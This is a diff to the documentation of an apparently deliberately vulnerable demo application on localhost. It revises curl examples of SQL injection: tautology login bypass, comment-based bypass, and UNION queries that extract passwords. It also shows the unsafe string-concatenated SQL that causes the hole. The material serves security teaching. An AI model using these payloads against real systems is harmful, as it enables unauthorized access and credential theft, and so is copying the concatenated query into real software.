@@ -155,25 +155,24 @@ curl "http://localhost:8080/api/users/all"
 
 ## SQL Injection Examples
 
-### Example 1: Authentication bypass
+### Example 1: Change query conditions
 
 **Request:**
 ```bash
-curl "http://localhost:8080/api/users/search?username=admin' OR '1'='1"
+curl "http://localhost:8080/api/users/by-username?username=admin' OR '1'='1"
+```
+
+**Request:**
+```bash
+curl "http://localhost:8080/api/users/by-username?username=' OR '1'='1"
+```
+
+**Request:**
+```bash
+curl "http://localhost:8080/api/users/by-term?term=' OR '1'='1"
 ```
 
 **Result:** Returns all users from the database
-
-### Example 2: SQL commenting
-
-**Request:**
-```bash
-curl "http://localhost:8080/api/users/search?username=admin'--"
-```
-
-**Result:** Returns admin user, ignoring other conditions
-
-### Example 3: Authorization bypass
 
 **Request:**
 ```bash
@@ -182,23 +181,42 @@ curl -X POST http://localhost:8080/api/users/login \
   -d "{\"username\": \"admin\", \"password\": \"' OR '1'='1\"}"
 ```
 
+```bash
+curl -X POST http://localhost:8080/api/users/login \
+  -H "Content-Type: application/json" \
+  -d "{\"username\": \"' OR '1'='1\", \"password\": \"' OR '1'='1\"}"
+```
+
 **Result:** Successful authentication without knowing the password
 
-### Example 4: Extract all data
+### Example 2: SQL commenting
 
 **Request:**
 ```bash
-curl "http://localhost:8080/api/users/by-term?term=' OR '1'='1'--"
+curl -X POST http://localhost:8080/api/users/login \
+  -H "Content-Type: application/json" \
+  -d "{\"username\": \"any' OR '1'='1'--\", \"password\": \"Karapuzik\"}"
 ```
 
-**Result:** Returns all users regardless of the search query
+**Result:** Successful authentication without knowing the user and password
 
-### Example 5: UNION attack
+### Example 3: UNION attack
 
 **Request:**
 ```bash
-curl "http://localhost:8080/api/users/search?username=' UNION SELECT * FROM users--"
+curl "http://localhost:8080/api/users/by-username?username=' UNION SELECT * FROM users--"
 ```
+
+**Result:** Returns all users from the database
+
+### Example 4: UNION + SQL commenting attack
+
+**Request:**
+```bash
+curl "http://localhost:8080/api/users/by-username?username=' UNION SELECT u.ID, u.USERNAME, u.PASSWORD as EMAIL, u.PASSWORD, u.ROLE FROM users u--"
+```
+
+**Result:** Get password in another field bypassing filtration in entity->dto mapper
 
 ## Why is this vulnerable?
 
@@ -206,6 +224,8 @@ The `VulnerableUserRepository.java` file uses unsafe SQL construction methods:
 
 ```java
 String sql = "SELECT * FROM users WHERE username = '" + username + "'";
+
+String sql = "SELECT * FROM users WHERE username = '" + username + "' AND password = '" + password + "'"
 ```
 
 User input is directly inserted into SQL queries without validation and escaping.
